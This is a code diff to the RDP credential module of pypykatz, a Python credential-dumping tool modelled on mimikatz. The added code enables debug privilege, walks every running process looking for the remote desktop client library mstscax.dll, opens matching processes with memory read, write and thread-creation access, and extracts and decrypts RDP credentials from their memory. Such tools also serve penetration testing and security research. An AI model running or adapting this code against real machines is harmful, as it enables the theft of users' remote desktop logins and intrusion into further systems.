@@ -7,27 +7,53 @@ from pypykatz.rdp.packages.creds.templates import RDPCredsTemplate
 from pypykatz.rdp.packages.creds.decryptor import RDPCredentialDecryptor
 
 class RDPCredParser:
-	def __init__(self, reader, sysinfo):
+	def __init__(self, process, reader, sysinfo):
+		self.process = process
 		self.reader = reader
 		self.sysinfo = sysinfo
 		self.credentials = []
 	
 	@staticmethod
-	def go_live(pid):
+	def go_live(pid = None):
 		if platform.system() != 'Windows':
 			raise Exception('Live parsing will only work on Windows')
 		from pypykatz.commons.readers.local.common.live_reader_ctypes import OpenProcess, PROCESS_ALL_ACCESS
+		from pypykatz.commons.winapi.machine import LiveMachine
+		from pypykatz.commons.winapi.constants import PROCESS_VM_READ , PROCESS_VM_WRITE , PROCESS_VM_OPERATION , PROCESS_QUERY_INFORMATION , PROCESS_CREATE_THREAD
 		from pypykatz.commons.readers.local.common.privileges import enable_debug_privilege
 		from pypykatz.commons.readers.local.live_reader import LiveReader
+		from pypykatz.commons.readers.local.process import Process
 
 		enable_debug_privilege()
-		phandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-		reader = LiveReader(process_handle=phandle)
-		sysinfo = KatzSystemInfo.from_live_reader(reader)
-		mimi = RDPCredParser(reader.get_buffered_reader(), sysinfo)
-		mimi.start()
-		return mimi
-	
+		targets = []
+
+		if pid is not None:
+			process = Process(pid=pid, access = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD )
+			reader = LiveReader(process_handle=process.phandle)
+			sysinfo = KatzSystemInfo.from_live_reader(reader)
+			targets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo))
+		
+		else:
+			machine = LiveMachine()
+			for pid in machine.list_all_pids():
+				try:
+					process = Process(pid=pid, access = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD )
+					for module in process.list_modules():
+						if module.name.lower().find("mstscax.dll") != -1:
+							print('Found DLL')
+							reader = LiveReader(process_handle=process.phandle)
+							sysinfo = KatzSystemInfo.from_live_reader(reader)
+							targets.append(RDPCredParser(process, reader, sysinfo))
+							break
+				except Exception as e:
+					#import traceback
+					#traceback.print_exc()
+					print(e)
+		
+		for target in targets:
+			target.start()
+
+
 	@staticmethod
 	def parse_minidump_file(filename, chunksize = 10*1024):
 		try:
@@ -38,7 +64,7 @@ class RDPCredParser:
 			logger.exception('Minidump parsing error!')
 			raise e
 		try:
-			mimi = RDPCredParser(reader, sysinfo)
+			mimi = RDPCredParser(None, reader, sysinfo)
 			mimi.start()
 		except Exception as e:
 			logger.info('Credentials parsing error!')
@@ -47,7 +73,7 @@ class RDPCredParser:
 
 	def rdpcreds(self):
 		decryptor_template = RDPCredsTemplate.get_template(self.sysinfo)
-		decryptor = RDPCredentialDecryptor(self.reader, decryptor_template, self.sysinfo, None)
+		decryptor = RDPCredentialDecryptor(self.process, self.reader, decryptor_template, self.sysinfo)
 		decryptor.start()
 
 		for cred in decryptor.credentials:
